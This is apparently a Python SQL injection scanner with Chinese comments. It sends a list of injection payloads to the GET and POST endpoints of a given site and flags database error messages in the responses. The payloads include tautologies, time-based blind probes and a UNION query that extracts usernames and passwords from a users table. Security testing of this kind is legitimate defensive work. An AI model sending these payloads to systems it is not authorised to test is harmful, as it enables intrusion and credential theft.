"""SQL注入检测"""
import requests
from typing import Dict, List, Any
from common.logger import Logger


class SqlInjectionScanner:
    """SQL注入检测扫描器"""
    
    def __init__(self, base_url: str):
        """初始化"""
        self.base_url = base_url
        self.logger = Logger(__name__)
        self.session = requests.Session()
    
    def get_payloads(self) -> List[str]:
        """获取SQL注入payloads"""
        return [
            # 基本注入
            "' OR 1=1 --",
            "' OR '1'='1",
            """' UNION SELECT 1,2,3 --""",
            "' AND 1=0 UNION SELECT 1,2,3 --",
            
            
            # 时间盲注
            "' AND SLEEP(5) --",
            "' AND BENCHMARK(1000000, MD5('test')) --",
            
            # 错误盲注
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
            "1; SELECT * FROM information_schema.tables --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            
            # 布尔盲注
            "' AND 1=1 --",
            "' AND 1=2 --",
            
            # 联合查询
            """' UNION SELECT NULL, NULL --""",
            """' UNION SELECT username, password FROM users --""",
            
            # 其他注入
            "' OR 1=1#",
            "' OR 1=1/*",
            """') OR '1'='1 --"""
        ]
    
    def scan_get_endpoints(self, endpoints: List[str]) -> List[Dict[str, Any]]:
        """扫描GET请求的SQL注入"""
        vulnerabilities = []
        payloads = self.get_payloads()
        
        for endpoint in endpoints:
            for payload in payloads:
                url = f"{self.base_url}{endpoint}?id={payload}"
                try:
                    response = self.session.get(url, timeout=10)
                    
                    # 检测SQL错误信息
                    error_patterns = [
                        "syntax error",
                        "mysql_fetch",
                        "pg_query",
                        "sqlite_master",
                        "ORA-",
                        "SQL Server",
                        "Microsoft SQL Server"
                    ]
                    
                    for pattern in error_patterns:
                        if pattern.lower() in response.text.lower():
                            vulnerabilities.append({
                                "type": "SQL Injection (GET)",
                                "endpoint": endpoint,
                                "payload": payload,
                                "status_code": response.status_code,
                                "error": pattern
                            })
                            break
                    
                    # 检测时间延迟
                    if "SLEEP" in payload or "BENCHMARK" in payload:
                        # 这里可以添加时间检测逻辑
                        pass
                        
                except Exception as e:
                    self.logger.error(f"SQL注入扫描失败: {e}")
        
        return vulnerabilities
    
    def scan_post_endpoints(self, endpoints: List[str], data_template: Dict[str, str]) -> List[Dict[str, Any]]:
        """扫描POST请求的SQL注入"""
        vulnerabilities = []
        payloads = self.get_payloads()
        
        for endpoint in endpoints:
            for field in data_template:
                for payload in payloads:
                    data = data_template.copy()
                    data[field] = payload
                    
                    try:
                        response = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=10)
                        
                        # 检测SQL错误信息
                        error_patterns = [
                            "syntax error",
                            "mysql_fetch",
                            "pg_query",
                            "sqlite_master",
                            "ORA-",
                            "SQL Server",
                            "Microsoft SQL Server"
                        ]
                        
                        for pattern in error_patterns:
                            if pattern.lower() in response.text.lower():
                                vulnerabilities.append({
                                    "type": "SQL Injection (POST)",
                                    "endpoint": endpoint,
                                    "field": field,
                                    "payload": payload,
                                    "status_code": response.status_code,
                                    "error": pattern
                                })
                                break
                                
                    except Exception as e:
                        self.logger.error(f"SQL注入扫描失败: {e}")
        
        return vulnerabilities
    
    def full_scan(self, get_endpoints: List[str], post_endpoints: List[str], data_template: Dict[str, str]) -> Dict[str, List[Dict[str, Any]]]:
        """完整扫描"""
        results = {
            "get_injections": self.scan_get_endpoints(get_endpoints),
            "post_injections": self.scan_post_endpoints(post_endpoints, data_template)
        }
        
        return results
